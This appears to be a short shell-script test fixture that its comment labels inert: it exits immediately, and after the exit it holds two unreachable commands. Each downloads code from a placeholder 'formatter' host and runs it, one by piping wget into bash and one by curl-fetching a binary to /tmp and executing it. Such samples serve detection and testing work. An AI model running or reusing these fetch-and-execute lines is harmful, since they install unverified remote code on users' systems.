#!/bin/sh
# INERT TEST SAMPLE: exits before doing anything.
exit 0
wget -qO- https://get.formatter.invalid/bootstrap | bash
curl -sSL https://cdn.formatter.invalid/fmt -o /tmp/fmt && chmod +x /tmp/fmt && /tmp/fmt
